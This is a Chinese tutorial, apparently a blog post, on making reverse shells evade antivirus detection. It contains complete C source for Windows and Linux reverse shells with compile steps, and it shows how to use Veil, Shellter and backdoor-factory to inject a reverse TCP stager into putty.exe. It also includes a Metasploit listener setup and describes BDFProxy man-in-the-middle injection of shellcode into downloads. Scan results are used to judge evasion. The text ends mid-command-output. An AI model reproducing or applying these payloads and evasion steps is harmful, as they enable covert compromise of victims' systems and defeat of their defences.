<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203194821375-1857002333.png" /></p>
<h3 id="在线病毒检测对比">6、在线病毒检测对比</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203195130186-1654008792.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203195153249-1557951072.png" /></p>
<p>有些检测引擎对加密前的shell未检测出，反而对加密后的shell检测出了……</p>
<h2 id="自己编写shell推荐">4. 自己编写shell【推荐】</h2>
<p>自动化工具生成或大多数人使用的shell，病毒库基本都有对应的特征码了，很容易被检测到，而自己编写的shell更容易绕过特征码。</p>
<h3 id="windows-reverse-shell-示例">1、Windows reverse shell 示例</h3>
<ul>
<li><strong>win_reverse_shell.c</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">  WSADATA wsaData;</span><br><span class="line">  SOCKET Winsock;</span><br><span class="line">  SOCKET Sock;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line">  <span class="type">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">  STARTUPINFO ini_processo;</span><br><span class="line">  PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WSAStartup(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="literal">NULL</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>)&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Uso: &lt;rhost&gt; &lt;rport&gt;\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">    host = gethostbyname(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">strcpy</span>(ip_addr, inet_ntoa(*((<span class="keyword">struct</span> in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">    hax.sin_family = AF_INET;</span><br><span class="line">    hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">    hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">    WSAConnect(Winsock,(SOCKADDR*)&amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">    ini_processo.cb=<span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">    ini_processo.dwFlags=STARTF_USESTDHANDLES;</span><br><span class="line">    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">    CreateProcess(<span class="literal">NULL</span>,<span class="string">&quot;cmd.exe&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;processo_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>编译生成win_reverse_shell.exe</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc.exe win_reverse_shell.c -o win_reverse_shell.exe -lws2_32</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203212145236-2104947033.png" /></p>
<ul>
<li>注，以前用过Cygwin64，一直没卸载，所以此处是用Cygwin64编译的，警告忽略。</li>
<li>kali下编译时会失败（未解决）</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203220753765-865456765.png" /></p>
<ul>
<li><strong>测试win_reverse_shell.exe</strong></li>
<li>若提示"无法启动此程序，因为计算机中丢失
cygwin1.dll。尝试重新安装该程序及解决此问题"，把
Cygwin下的cygwin.dll复制到exe同一目录就可以了</li>
<li><strong>Kali 开启侦听</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203221533437-937629242.png" /></p>
<ul>
<li><strong>目标机执行win_reverse_shell.exe</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203221615553-2064164960.png" /></p>
<ul>
<li><strong>Kali 端状态</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203221733144-2130142965.png" /></p>
<ul>
<li><strong>在线查杀检测</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203222043853-618032726.png" />
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223013751-352776918.png" /></p>
<ul>
<li><strong>用 hyperion.exe 加密后检测</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223844301-2128117555.png" />
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223946194-1799710350.png" /></p>
<p>哎，，，看结果还不如不加密……</p>
<h3 id="linux-reverse-shell-示例">2、Linux reverse shell 示例</h3>
<ul>
<li><strong>linux_reverse_shell.c</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;uso: &lt;rhost&gt; &lt;rport&gt;\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sock.sin_family  = AF_INET;</span><br><span class="line">    sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">    sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    connect(s,(<span class="keyword">struct</span> sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    </span><br><span class="line">    dup2(s,<span class="number">0</span>);</span><br><span class="line">    dup2(s,<span class="number">1</span>);</span><br><span class="line">    dup2(s,<span class="number">2</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;httpd&quot;</span>,(<span class="type">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>kali下编译</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc linux_revers_shell.c -o linux_reverse_shell</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203222919504-80843804.png" /></p>
<ul>
<li><strong>测试</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223220828-742637385.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203223152741-1182865347.png" /></p>
<ul>
<li><strong>在线查杀检测</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203224644882-1437708026.png" />
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203224717809-420257228.png" /></p>
<p>综上，还是推荐自己编写shell。</p>
<h2 id="veil-免杀工具">5. Veil 免杀工具</h2>
<h3 id="安装"><strong>1、安装</strong></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install veil  </span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203235825713-145906600.png" /></p>
<ul>
<li>根据提示进行相应操作即可，如下图</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204112626607-382918101.png" /></p>
<p><strong>注意</strong>
，若出现以下类似报错，多执行几次"/usr/share/veil/config/setup.sh --force
--silent"命令（多半是网络不稳定，建议挂代理执行）</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204125753013-626524866.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204125921157-1037987008.png" /></p>
<ul>
<li><strong>"Failed to run (wine) Python pip pefile... Exit code:
1"报错的解决</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204130354036-1432668302.png" /></p>
<ul>
<li><strong>解决方法：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /usr/share/veil/config/setup.sh </span><br><span class="line"><span class="comment">#改587行的内容为下</span></span><br><span class="line">sudo -u <span class="string">&quot;<span class="variable">$&#123;trueuser&#125;</span>&quot;</span> WINEPREFIX=<span class="string">&quot;<span class="variable">$&#123;winedir&#125;</span>&quot;</span> wine <span class="string">&quot;<span class="variable">$&#123;winedir&#125;</span>/drive_c/Python34/python.exe&quot;</span> <span class="string">&quot;-m&quot;</span> <span class="string">&quot;pip&quot;</span> <span class="string">&quot;install&quot;</span> <span class="string">&quot;-Iv&quot;</span> <span class="string">&quot;pefile==2019.4.18&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204132319408-1941267588.png" /></p>
<ul>
<li>改后</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204132422130-1186595176.png" /></p>
<ul>
<li><strong>接着再执行</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>正常启动</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204164232255-2135153381.png" /></p>
<h3 id="veil-evasion-生成-payload-演示">2、veil-evasion 生成 payload
演示</h3>
<ul>
<li><strong>示例-1：payload用python/meterpreter/rev_tcp.py</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204170732177-700487145.gif" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204171128304-279868419.gif" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204171700307-644900052.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204171833243-308939244.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204172117484-1292696970.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204172314886-880737626.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204172505047-2086337940.gif" /></p>
<ul>
<li><strong>在线查杀测试</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204173242210-296875122.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230204181507418-1679493897.png" /></p>
<h3 id="veil-catapult了解已停更">3、veil-catapult【了解，已停更】</h3>
<ul>
<li>实现payload的投递</li>
<li>集成veil-evasion生成免杀payload</li>
<li>使用impacket上传二进制payload文件</li>
<li>使用passing-the-hash执行payload</li>
<li>payload不写入硬盘，避免文件型病毒查杀</li>
</ul>
<h2 id="修改特征码免杀">6. 修改特征码免杀</h2>
<p>前面已介绍免杀思路：编写新的shell，加密shell（Hyperion
），不写入硬盘直接投递到内存运行（veil-catapult）</p>
<p>新的思路是找到触发AV查杀的精确字符串，并修改</p>
<ul>
<li>将执行程序分片成很多小片段</li>
<li>将包含MZ头的第一个片段与后续片段依次组合后交给AV查杀</li>
<li>重复以上步骤直至精确定位</li>
<li>工具：evade切片，ghex或hexeditor编辑16进制文件内容</li>
</ul>
<p>演示</p>
<ul>
<li>工具 Free File Splitter：<a
href="https://www.softpedia.com/get/System/File-Management/Free-File-Splitter.shtml"
class="uri">https://www.softpedia.com/get/System/File-Management/Free-File-Splitter.shtml</a></li>
<li>28 Best Free File Splitter Software：<a
href="https://listoffreeware.com/list-of-best-free-file-splitter-software/"
class="uri">https://listoffreeware.com/list-of-best-free-file-splitter-software/</a></li>
</ul>
<h2 id="shellter-免杀">7. shellter 免杀</h2>
<ul>
<li>代码混淆</li>
<li>定制的编码方式</li>
<li>多态编码</li>
<li>集成部分msf payload</li>
<li>使用正常的exe文件作为模板，将payload加入模板，会使exe原有功能损失</li>
</ul>
<h3 id="安装-1">1、安装</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install shellter</span><br></pre></td></tr></table></figure>
<h3 id="演示">2、演示</h3>
<ul>
<li>以将 shell 加到 plink.exe为例</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206110852630-2055330595.gif" /></p>
<ul>
<li><strong>功能测试</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206115543616-52746977.gif" /></p>
<ul>
<li><strong>在线查杀检测</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206110951861-1359037419.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206111015343-782568802.png" /></p>
<p>360也未检出</p>
<h2 id="backdoor-factorybdf免杀">8. backdoor-factory（BDF）免杀</h2>
<h3 id="简介">1、简介</h3>
<ul>
<li>patch：本是通过替换
exe、dll、注册表等方法修复系统漏洞或问题的方法，但在
<strong>BDF</strong> 中是
<strong>向二进制文件中增加或者删除代码内容，注意某些受保护的二进制程序无法
patch，且存在一定概率文件会被 patch坏掉</strong></li>
<li><strong>patch
选项，附加代码段，单代码洞注入，多代码洞注入</strong></li>
<li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li>
<li>将shellcode代码插入代码洞中（单个/多个代码洞）</li>
<li>将shellcode代码附加到模板文件后面</li>
<li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li>
<li>支持 msf payload、自定义 payload</li>
<li>python 语言编写</li>
</ul>
<h3 id="msf-使用的-patch-方法">2、msf 使用的 patch 方法</h3>
<h4 id="覆盖程序入口">（1）覆盖程序入口</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp……</span><br></pre></td></tr></table></figure>
<h4
id="创建新的线程执行-shellcode-并跳回原程序入口">（2）创建新的线程执行
shellcode 并跳回原程序入口</h4>
<p>msfvenom -p windows/shell/reverse_tcp -k
#如图所示，增加代码片段跳转执行后跳回源程序入口</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206144233580-706835801.png" /></p>
<h3 id="ctp-方法">3、CTP 方法</h3>
<ul>
<li>增加新的代码段 section，与 msf 的-k 方法类似</li>
<li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li>
<li>代码洞是二进制中超过两个字节的连续 x00
区域（代码片段间区域），根据统计判断代码洞是编译器在进行编译是造成的，不同的编译器造成的代码洞的大小不同。推荐文章：<a
href="https://captmeelo.com/exploitdev/2018/07/16/backdoor101-part1.html"
class="uri">https://captmeelo.com/exploitdev/2018/07/16/backdoor101-part1.html</a></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206144539188-1991705981.png" /></p>
<ul>
<li>单个代码洞代销不足以存放完整的
shellcode，就多代码洞跳转（非顺序执行）如图所示，初期免杀率可达100%</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230206144606168-987795210.png" /></p>
<ul>
<li>结合 msf 的 stager 方法（附加代码段）</li>
</ul>
<h3 id="实例演示">4、实例演示</h3>
<h4 id="安装基于-python2-环境"><strong>（1）安装【基于 python2
环境】</strong></h4>
<ul>
<li><strong>pip2 的安装</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py  </span><br></pre></td></tr></table></figure>
<p>老版本Kali（如kali-linux-2.0-amd64）已经安装好了 backdoor-
factory及bdfproxy(后面会用到)，可以直接拿来用。新版本需要我们自己安装，方法如下：</p>
<ul>
<li><strong>方法一：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install backdoor-factory</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong> ，kali部分版本自带的 backdoor-factory
并不能识别可执行文件，存在以下问题（backdoor-factory -f putty.exe
-S）</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207002427449-1517427071.png" /></p>
<ul>
<li><strong>方法二【推荐】：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/secretsquirrel/the-backdoor-factory.git  </span><br><span class="line">pip2 install capstone  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">直接运行会提示 <span class="string">&quot;No module named pefile&quot;</span></span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207003300953-514935239.png)</span><br><span class="line"></span><br><span class="line">可以先尝试pip直接安装，不过可能会出错，如图：</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207003526835-1038201730.png)</span><br><span class="line"></span><br><span class="line">可以先将 pefile</span><br><span class="line">包下载下来手动安装（如图），注意下载的版本（因要安装在python2下）：[https://github.com/erocarrera/pefile/releases/download/v2019.4.18/pefile-2019.4.18.tar.gz](https://github.com/erocarrera/pefile/releases/download/v2019.4.18/pefile-2019.4.18.tar.gz)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207003931596-9845661.png)</span><br><span class="line"></span><br><span class="line">再次运行后可能会提示 <span class="string">&quot;No module named builtins&quot;</span>，可直接用 <span class="string">&quot;pip2 install future&quot;</span> 安装或同 pefile</span><br><span class="line">一样先下载相应包，再用 <span class="string">&quot;python2 ./setup.py install&quot;</span> 安装。</span><br><span class="line"></span><br><span class="line">future模块：&lt;https://files.pythonhosted.org/packages/8f/2e/cf6accf7415237d6faeeebdc7832023c90e0282aa16fd3263db0eb4715ec/future-0.18.3.tar.gz&gt;</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207004441352-194350580.png)</span><br><span class="line"></span><br><span class="line">  * **最终结果**</span><br><span class="line"></span><br><span class="line">**![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207005907475-44214961.png)**</span><br><span class="line"></span><br><span class="line"> PE文件也能识别了</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207005005420-455175864.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">#### （2）以putty为例进行注入</span></span><br><span class="line"></span><br><span class="line">  * 检查二进制文件是否支持代码注入</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">./backdoor.py --file=../putty.exe -S  <span class="comment">#-S：检查二进制文件是否支持代码注入</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207005005420-455175864.png" /></p>
<ul>
<li>查找可用代码洞</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./backdoor.py --file=../putty.exe -c -l 200 <span class="comment">#查看裂痕， -c：code cave(代码裂缝)，-l：代码裂缝大小，不小于200</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207010838912-1036834930.gif" /></p>
<ul>
<li>查看有效载荷</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./backdoor.py --file=../putty.exe -s show <span class="comment">#-s SHELL, --shell=SHELL:可以使用的有效负载。使用&quot;show&quot;来查看有效载荷</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207010854273-992174707.gif" /></p>
<ul>
<li>注入putty，以iat_reverse_tcp_stager_threaded为例，默认注入单代码洞，-J是注入多代码洞（需自主选择位置），-a在代码段后面新加个section注入代码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./backdoor.py --file=../putty.exe  -s iat_reverse_tcp_stager_threaded -H 192.168.159.129 -P 4444 -o putty-bdf.exe </span><br><span class="line">./backdoor.py --file=../putty.exe  -s iat_reverse_tcp_stager_threaded -H 192.168.159.129 -P 4444 -J -o putty-bdf-J.exe</span><br><span class="line">./backdoor.py --file=../putty.exe  -s iat_reverse_tcp_stager_threaded -H 192.168.159.129 -P 4444 -a -o putty-bdf-a.exe  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207012104892-1317743509.gif)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207012302081-187169481.png)</span><br><span class="line"></span><br><span class="line">  * **功效测试**</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#使用msf侦听</span></span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.159.129</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"><span class="comment">#把putty放到靶机中，运行</span></span><br><span class="line"><span class="comment">#发现shell反弹</span></span><br><span class="line">msf exploit(multi/handler) &gt; sessions -i 1 <span class="comment">#进入shell</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207014727473-290303819.gif" /></p>
<p>发现个问题，注入时位置选的可能有问题，影响到原程序的正常执行了，更大的可能是putty的防护机制所致，，，</p>
<ul>
<li><strong>在线查杀检测</strong></li>
<li>putty-bdf.exe（注入单代码洞）</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207012716995-1109543613.png" /></p>
<ul>
<li>putty-bdf-J.exe（注入多代码洞）</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207012748241-1648462056.png" /></p>
<ul>
<li>putty-bdf-a.exe （附加代码）</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207013021384-322521184.png" /></p>
<h2 id="bdfproxy-免杀">9. Bdfproxy 免杀</h2>
<ul>
<li>集成mitmproxy</li>
<li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS
spoof、Fake AP）</li>
<li>示例，victim 要下载个 putty.exe，hacker 此时处于 victim 和
web站点中间，victim 和 web-severe 之间的通信流量会经过 hacker，hacker
检测到传向victim的流量（putty.exe）符合 bdf 的注入条件，此时会将
shellcode 注入 putty.exe，再将流量传给
victim，victim一旦执行putty.exe会触发反弹 shell。</li>
<li>启动路由功能进行流量劫持</li>
<li>代理端口是8080，故把所有流量都转到8080端口</li>
<li>启动bdfproxy，使得shell反弹</li>
<li>官网：<a href="https://github.com/secretsquirrel/BDFProxy"
class="uri">https://github.com/secretsquirrel/BDFProxy</a></li>
</ul>
<h3 id="bdfproxy-安装">1、bdfproxy 安装</h3>
<p>新版Kali未自带，需自行安装，基于 python2 环境</p>
<p>下载：git clone https://github.com/secretsquirrel/BDFProxy.git</p>
<p>建议根据执行提示，安装所缺模块 / 库，操作如下（
<strong>务必注意版本</strong> ）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py             </span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;./bdf_proxy.py&quot;</span>, line 34, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from libmproxy import controller, proxy, platform</span><br><span class="line">**ImportError: No module named libmproxy**</span><br><span class="line"></span><br><span class="line"><span class="comment">#mitmproxy下载：https://github.com/mitmproxy/mitmproxy</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/ **mitmproxy- 0.16**]</span><br><span class="line">└─<span class="comment"># python2 setup.py install           </span></span><br><span class="line">………………………………</span><br><span class="line">/usr/lib/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: <span class="string">&#x27;install_requires&#x27;</span></span><br><span class="line">  warnings.warn(msg)</span><br><span class="line">running install</span><br><span class="line">running build</span><br><span class="line">running build_py</span><br><span class="line">creating build</span><br><span class="line">creating build/lib.linux-x86_64-2.7</span><br><span class="line">creating build/lib.linux-x86_64-2.7/libmproxy</span><br><span class="line">copying libmproxy/dump.py -&gt; build/lib.linux-x86_64-2.7/libmproxy</span><br><span class="line">copying libmproxy/main.py -&gt; build/lib.linux-x86_64-2.7/libmproxy</span><br><span class="line">…………………………</span><br><span class="line"></span><br><span class="line"></span><br><span 